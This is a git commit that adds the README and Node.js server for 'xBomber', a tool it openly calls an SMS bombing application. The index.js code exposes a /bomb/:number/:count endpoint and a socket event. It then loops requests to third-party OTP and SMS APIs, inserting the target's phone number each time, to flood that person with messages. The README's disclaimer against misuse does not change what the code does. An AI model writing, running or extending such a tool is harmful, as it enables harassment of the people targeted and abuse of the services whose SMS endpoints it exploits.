c63d3b3b1cb37eb267359d0b4070684db5481857
itsmevikashkumarsigh <vikashkumarsigh8352@gmail.com>
2023-05-08 17:44:16 +0530

    First

---
+++ README.md
@@ -0,0 +1,55 @@
+<h1 align="center">
+  <br>
+  <a href="https://github.com/itsmevikashkumarsingh/xBomber"><img src="https://raw.githubusercontent.com/itsmevikashkumarsingh/xBomber/main/public/icon.png" alt="xBomber"></a>
+  <br>
+  xBomber
+  <br>
+</h1>
+
+<p align="center">A free and open-source SMS bombing application</p>
+
+## NOTE:
+
+- The application requires active internet connection to contact the APIs
+- You would not be charged for any SMS dispatched as a consequence of this script
+- Always ensure that you are using the latest version of xBomber
+- This application must not be used to cause harm/discomfort/trouble to others
+- By using this, you agree that you cannot hold the contributors responsible for any misuse
+
+## Compatibility
+You should have node installed on your device
+
+## Devices
+- Windows
+- Linux
+- Mac
+- Android (Termux)
+
+## Features
+
+- Web Based UI (can be used in browser)
+- Based on Node Js
+- Possibility of international API support
+- Flexible with addition of newer APIs with the help of JSON documents
+- Actively supported by the developers with frequent updates and bug-fixes
+
+
+## Installation:
+
+```bash
+git clone https://github.com/itsmevikashkumarsingh/xBomber-web
+cd xBomber-web
+npm i
+```
+## Usage
+```bash
+npm start
+```
+
+## Contributing
+Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
+
+Please make sure to update tests as appropriate.
+
+## License
+[MIT](https://choosealicense.com/licenses/mit/)
---
+++ index.js
@@ -0,0 +1,77 @@
+const express = require('express')
+const socketIO = require('socket.io'); 
+const fs = require('fs');
+const axios = require('axios');
+const http = require('http');
+const open = require('open');
+var port = 4321;
+const app = express()
+let server = http.createServer(app)
+let io = socketIO(server) 
+server.listen(port);
+console.log('xBomber started at localhost:'+port)
+open('http://localhost:'+port)
+
+app.use(express.static(__dirname + "/public"));
+app.get('/bomb/:number/:count', function (req, res) {
+    res.setHeader('Content-Type', 'application/json');
+    var number =  req.params.number;
+    var count = req.params.count || 1;
+    sendSms(number,count,res);
+})
+
+io.on('connection', (socket)=>{
+    console.log('New user connected');
+    socket.on('startBomb', (data)=>{ 
+        sendSms(data.number,data.count,socket) 
+    }); 
+});
+
+function sendSms(number,count=1,socket){
+    var success=0,failed=0;
+fs.readFile('apidata.json',async (err,data) =>{
+    if(err) throw err;
+
+    while(success<count){
+        var nom = Math.floor(Math.random() * 7);
+        var jj = JSON.stringify(JSON.parse(data).sms[91][nom]);
+        if(jj){
+            var json = jj.replace(/{target}/g,number).replace(/{cc}/g,"91");
+        json = JSON.parse(json);
+    
+        var newdata = {
+            url:json.url,
+            method:json.method,
+            data:json.data,
+            params:json.params,
+            json:json.json,
+            headers:json.headers,
+            timeout:6000
+        }
+        var identifier = json.identifier;
+        try {
+           var request = await axios(newdata);
+           var resp = JSON.stringify(request.data)
+           verified = resp.includes(identifier)
+           if(verified){
+                success++
+                console.log('Succes');
+                console.log(success);
+                var jsonf = {
+                  "success":success
+                }
+                socket.emit('bombing',jsonf);
+                console.log(json.name)
+            } else{
+            failed++;
+            console.log('failed');
+            console.log(failed);
+            } 
+        } catch(err){
+           //console.log(err);
+        }
+        
+        }
+   }
+})
+}
